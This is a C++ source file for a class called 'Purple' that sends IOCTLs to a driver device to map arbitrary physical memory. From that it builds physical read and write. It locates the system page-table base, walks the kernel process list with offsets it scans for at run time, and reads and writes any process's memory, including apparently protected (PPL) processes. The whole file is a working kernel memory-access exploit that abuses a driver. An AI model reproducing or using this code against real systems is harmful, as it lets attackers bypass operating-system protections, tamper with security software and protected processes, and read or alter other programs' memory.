#include "Purple.hpp"
#include <cstring>
#include <cstdio>
#include <cstdlib>

Purple::~Purple() { Close(); }

Purple::Purple(Purple&& Other) noexcept
    : m_Device(Other.m_Device), m_PoolBlockCount(Other.m_PoolBlockCount), m_SystemDTB(Other.m_SystemDTB) {
    memcpy(m_PoolBlocks, Other.m_PoolBlocks, sizeof(m_PoolBlocks));
    Other.m_Device = INVALID_HANDLE_VALUE;
    Other.m_PoolBlockCount = 0;
    Other.m_SystemDTB = 0;
}

Purple& Purple::operator=(Purple&& Other) noexcept {
    if (this != &Other) {
        Close();
        m_Device = Other.m_Device;
        m_PoolBlockCount = Other.m_PoolBlockCount;
        m_SystemDTB = Other.m_SystemDTB;
        memcpy(m_PoolBlocks, Other.m_PoolBlocks, sizeof(m_PoolBlocks));
        Other.m_Device = INVALID_HANDLE_VALUE;
        Other.m_PoolBlockCount = 0;
        Other.m_SystemDTB = 0;
    }
    return *this;
}

bool Purple::Initialize() {
    if (IsValid()) return true;
    m_Device = CreateFileA(CORMEM_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, nullptr,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, nullptr);
    if (!IsValid()) return false;
    if (!GetPoolBlockCount(&m_PoolBlockCount) || m_PoolBlockCount > CORMEM_MAX_POOL_BLOCKS) { Close(); return false; }
    for (uint32_t i = 0; i < m_PoolBlockCount; i++) { if (!MapPoolBlock(i)) { Close(); return false; } }
    return true;
}

void Purple::Close() {
    if (IsValid()) { CloseHandle(m_Device); m_Device = INVALID_HANDLE_VALUE; }
    m_PoolBlockCount = 0; m_SystemDTB = 0;
    memset(m_PoolBlocks, 0, sizeof(m_PoolBlocks));
}

bool Purple::SendIoctl(DWORD IoControlCode, void* InBuffer, DWORD InSize, void* OutBuffer, DWORD OutSize, DWORD* BytesReturned) {
    DWORD br = 0;
    BOOL r = DeviceIoControl(m_Device, IoControlCode, InBuffer, InSize, OutBuffer, OutSize, &br, nullptr);
    if (BytesReturned) *BytesReturned = br;
    return r != FALSE;
}

bool Purple::MapPoolBlock(uint32_t Index) {
    uint32_t input = Index;
    CORMEM_MAP_POOL_OUT output = {};
    DWORD br = 0;
    if (!SendIoctl(IOCTL_CORMEM_MAP_POOL, &input, sizeof(input), &output, sizeof(output), &br) || br == 0) return false;
    m_PoolBlocks[Index] = { output.UserAddress, output.KernelAddress, output.PhysicalAddress, output.Size };
    return true;
}

bool Purple::GetPoolBlockCount(uint32_t* Count) {
    uint32_t output = 0; DWORD br = 0;
    if (!SendIoctl(IOCTL_CORMEM_GET_POOL_BLOCK_COUNT, nullptr, 0, &output, sizeof(output), &br) || br == 0) return false;
    *Count = output; return true;
}


uint64_t Purple::MapBuffer(uint64_t Address, uint64_t Size, uint64_t Param) {
    SYSTEM_INFO si = {}; GetSystemInfo(&si);
    Size += Address & (si.dwPageSize - 1);
    CORMEM_MAP_BUFFER_IN in = { Address, Size, Param };
    uint64_t out = 0;
    SendIoctl(IOCTL_CORMEM_MAP_BUFFER, &in, sizeof(in), &out, sizeof(out));
    return out;
}

bool Purple::UnmapBuffer(uint64_t MappedAddress) {
    return SendIoctl(IOCTL_CORMEM_UNMAP_BUFFER, &MappedAddress, sizeof(MappedAddress), nullptr, 0);
}

bool Purple::ReadPhysicalMemory(uint64_t PhysicalAddress, void* Buffer, size_t Size) {
    uint64_t mapped = MapBuffer(PhysicalAddress, Size, 0);
    if (!mapped) return false;
    memcpy(Buffer, reinterpret_cast<void*>(mapped), Size);
    UnmapBuffer(mapped);
    return true;
}

bool Purple::WritePhysicalMemory(uint64_t PhysicalAddress, const void* Buffer, size_t Size) {
    uint64_t mapped = MapBuffer(PhysicalAddress, Size, 0);
    if (!mapped) return false;
    memcpy(reinterpret_cast<void*>(mapped), Buffer, Size);
    UnmapBuffer(mapped);
    return true;
}

bool Purple::TryFindDTBFromLowStub(uint8_t* LowStub1M, uint64_t& OutDTB, uint64_t& OutKernelEntry) {
    for (uint32_t offset = 0x1000; offset < 0x100000; offset += 0x1000) {
        uint64_t sig = *reinterpret_cast<uint64_t*>(LowStub1M + offset);
        if ((sig & PSB_SIGNATURE_MASK) != PSB_SIGNATURE_VALUE) continue;
        uint64_t kernelEntry = *reinterpret_cast<uint64_t*>(LowStub1M + offset + PSB_KERNEL_ENTRY_OFFSET);
        if ((kernelEntry & KERNEL_VA_MASK) != KERNEL_VA_EXPECTED) continue;
        uint64_t pml4 = *reinterpret_cast<uint64_t*>(LowStub1M + offset + PSB_PML4_OFFSET);
        if (pml4 & PML4_INVALID_BITS_MASK) continue;
        if (pml4 == 0 || pml4 > 0x100000000ULL) continue;

        OutDTB = pml4;
        OutKernelEntry = kernelEntry;
        return true;
    }
    return false;
}

bool Purple::ValidatePML4Page(uint64_t DTB, uint64_t MaxPhysAddr) {
    uint64_t pml4Page[512] = {};
    if (!ReadPhysicalMemory(DTB, pml4Page, sizeof(pml4Page))) return false;
    uint32_t validEntries = 0, kernelEntries = 0;
    for (int i = 0; i < 512; i++) {
        uint64_t entry = pml4Page[i];
        if (!(entry & PAGE_PRESENT)) continue;
        uint64_t pfn = entry & 0x000FFFFFFFFFF000ULL;
        if (pfn >= MaxPhysAddr) return false;
        validEntries++;
        if (i >= 256) kernelEntries++;
    }
    return validEntries > 0 && kernelEntries > 0;
}

uint64_t Purple::FindSystemDTB() {
    uint8_t* lowStub = new uint8_t[0x100000];
    if (!lowStub) return 0;
    for (uint32_t offset = 0; offset < 0x100000; offset += 0x1000) {
        if (!ReadPhysicalMemory(offset, lowStub + offset, 0x1000))
            memset(lowStub + offset, 0, 0x1000);
    }
    uint64_t dtb = 0, kernelEntry = 0;
    if (TryFindDTBFromLowStub(lowStub, dtb, kernelEntry)) {
        delete[] lowStub;
        if (ValidatePML4Page(dtb, 0x8000000000ULL)) {
            printf("dtb: 0x%llX\n", (unsigned long long)dtb);
            m_SystemDTB = dtb;
            return dtb;
        }
    } else {
        delete[] lowStub;
    }
    return 0;
}


uint64_t Purple::TranslateVirtualAddress(uint64_t DTB, uint64_t VirtualAddress) {
    uint64_t pml4Idx = (VirtualAddress >> 39) & 0x1FF;
    uint64_t pdptIdx = (VirtualAddress >> 30) & 0x1FF;
    uint64_t pdIdx = (VirtualAddress >> 21) & 0x1FF;
    uint64_t ptIdx = (VirtualAddress >> 12) & 0x1FF;
    uint64_t offset = VirtualAddress & 0xFFF;

    uint64_t pml4e = 0;
    if (!ReadPhysicalMemory((DTB & ~0xFFFULL) + pml4Idx * 8, &pml4e, 8) || !(pml4e & PAGE_PRESENT)) return 0;

    uint64_t pdpte = 0;
    if (!ReadPhysicalMemory((pml4e & 0x000FFFFFFFFFF000ULL) + pdptIdx * 8, &pdpte, 8) || !(pdpte & PAGE_PRESENT)) return 0;
    if (pdpte & PAGE_LARGE) return (pdpte & 0x000FFFFFC0000000ULL) + (VirtualAddress & (PAGE_1GB - 1));

    uint64_t pde = 0;
    if (!ReadPhysicalMemory((pdpte & 0x000FFFFFFFFFF000ULL) + pdIdx * 8, &pde, 8) || !(pde & PAGE_PRESENT)) return 0;
    if (pde & PAGE_LARGE) return (pde & 0x000FFFFFFFE00000ULL) + (VirtualAddress & (PAGE_2MB - 1));

    uint64_t pte = 0;
    if (!ReadPhysicalMemory((pde & 0x000FFFFFFFFFF000ULL) + ptIdx * 8, &pte, 8) || !(pte & PAGE_PRESENT)) return 0;

    return (pte & 0x000FFFFFFFFFF000ULL) + offset;
}

uint64_t Purple::FindProcessDTB(DWORD Pid, uint64_t& OutBaseAddress) {
    OutBaseAddress = 0;
    if (m_SystemDTB == 0 && FindSystemDTB() == 0) return 0;

    // 1. PsInitialSystemProcess
    HMODULE hPsapi = LoadLibraryA("psapi.dll");
    if (!hPsapi) return 0;
    typedef BOOL(WINAPI* EnumDeviceDrivers_t)(LPVOID*, DWORD, LPDWORD);
    auto pEnumDeviceDrivers = (EnumDeviceDrivers_t)GetProcAddress(hPsapi, "EnumDeviceDrivers");
    LPVOID drivers[1024]; DWORD cbNeeded;
    if (!pEnumDeviceDrivers || !pEnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) { FreeLibrary(hPsapi); return 0; }
    uint64_t kernelBase = (uint64_t)drivers[0]; FreeLibrary(hPsapi);

    HMODULE hUserSpace = LoadLibraryExA("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hUserSpace) return 0;
    FARPROC pPsInitial = GetProcAddress(hUserSpace, "PsInitialSystemProcess");
    uint64_t offset = (uint64_t)pPsInitial - (uint64_t)hUserSpace;
    FreeLibrary(hUserSpace);

    uint64_t psInitialPtrVA = kernelBase + offset;
    uint64_t physPtr = TranslateVirtualAddress(m_SystemDTB, psInitialPtrVA);
    if (!physPtr) return 0;

    uint64_t systemEprocessVA = 0;
    ReadPhysicalMemory(physPtr, &systemEprocessVA, sizeof(systemEprocessVA));
    if (!systemEprocessVA) return 0;

    uint64_t systemEprocessPhys = TranslateVirtualAddress(m_SystemDTB, systemEprocessVA);
    if (!systemEprocessPhys) return 0;

    // =========================================================================
    // 2. SCANNER DYNAMIQUE OFFSET
    // =========================================================================
    uint8_t eprocBuffer[0x1000] = { 0 };
    ReadPhysicalMemory(systemEprocessPhys, eprocBuffer, sizeof(eprocBuffer));

    uint32_t off_Pid = 0, off_Links = 0, off_Peb = 0;

    //  SCAN  RAM de l'EPROCESS PID 4
    for (uint32_t i = 0x80; i < 0x800; i += 8) {
        uint64_t val = *(uint64_t*)(eprocBuffer + i);

        if (val == 4) { 
            uint64_t flink = *(uint64_t*)(eprocBuffer + i + 8); // ActiveProcessLinks  +8 octets après

            // Verif  liste pointe  vers le noyau 
            if ((flink & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
                off_Pid = i;
                off_Links = i + 8;
                off_Peb = i + 0x110; // PEB  0x110
                break;
            }
        }
    }

    if (off_Pid == 0) {
        printf("[-] ERREUR : Impossible de generer les offsets dynamiques.\n");
        return 0;
    }

    printf("[+] Offsets Kernel  -> PID: 0x%X | Links: 0x%X | PEB: 0x%X\n", off_Pid, off_Links, off_Peb);

    // =========================================================================
    // 3. RECHERCHE DANS LA LISTE AVEC LES BONS OFFSETS
    // =========================================================================
    uint64_t listHeadVA = systemEprocessVA + off_Links;
    uint64_t firstFlink = 0;
    uint64_t listHeadPhys = TranslateVirtualAddress(m_SystemDTB, listHeadVA);
    if (!listHeadPhys) return 0;
    ReadPhysicalMemory(listHeadPhys, &firstFlink, sizeof(firstFlink));

    uint64_t currentFlink = firstFlink;
    uint32_t count = 0;

    do {
        uint64_t eprocessVA = currentFlink - off_Links;
        uint64_t eprocessPhys = TranslateVirtualAddress(m_SystemDTB, eprocessVA);
        if (!eprocessPhys) break;

        uint64_t currentPid = 0;
        ReadPhysicalMemory(eprocessPhys + off_Pid, &currentPid, sizeof(currentPid));

        if (currentPid == (uint64_t)Pid) {
            uint64_t processDTB = 0;
            ReadPhysicalMemory(eprocessPhys + 0x28, &processDTB, sizeof(processDTB)); // Le CR3 = 0x28

            // Extract PEB (Base Address du PPL)
            uint64_t pebVA = 0;
            ReadPhysicalMemory(eprocessPhys + off_Peb, &pebVA, sizeof(pebVA));
            if (pebVA && processDTB) {
                uint64_t pebPhys = TranslateVirtualAddress(processDTB, pebVA);
                if (pebPhys) ReadPhysicalMemory(pebPhys + 0x10, &OutBaseAddress, sizeof(OutBaseAddress));
            }
            return processDTB;
        }

        uint64_t flinkPhys = TranslateVirtualAddress(m_SystemDTB, currentFlink);
        if (!flinkPhys) break;

        uint64_t nextFlink = 0;
        ReadPhysicalMemory(flinkPhys, &nextFlink, sizeof(nextFlink));
        if (nextFlink == firstFlink || nextFlink == 0) break;

        currentFlink = nextFlink;
        count++;
    } while (count < 8192);

    return 0;
}


bool Purple::ReadProcessMemory(uint64_t DTB, uint64_t VirtualAddress, void* Buffer, size_t Size) {
    uint8_t* dst = static_cast<uint8_t*>(Buffer);
    size_t remaining = Size;
    uint64_t va = VirtualAddress;
    while (remaining > 0) {
        uint64_t phys = TranslateVirtualAddress(DTB, va);
        if (phys == 0) return false;
        size_t chunk = min(remaining, (size_t)(PAGE_4KB - (va & 0xFFF)));
        if (!ReadPhysicalMemory(phys, dst, chunk)) return false;
        dst += chunk; va += chunk; remaining -= chunk;
    }
    return true;
}

bool Purple::WriteProcessMemory(uint64_t DTB, uint64_t VirtualAddress, const void* Buffer, size_t Size) {
    const uint8_t* src = static_cast<const uint8_t*>(Buffer);
    size_t remaining = Size;
    uint64_t va = VirtualAddress;
    while (remaining > 0) {
        uint64_t phys = TranslateVirtualAddress(DTB, va);
        if (phys == 0) return false;
        size_t chunk = min(remaining, (size_t)(PAGE_4KB - (va & 0xFFF)));
        if (!WritePhysicalMemory(phys, src, chunk)) return false;
        src += chunk; va += chunk; remaining -= chunk;
    }
    return true;
}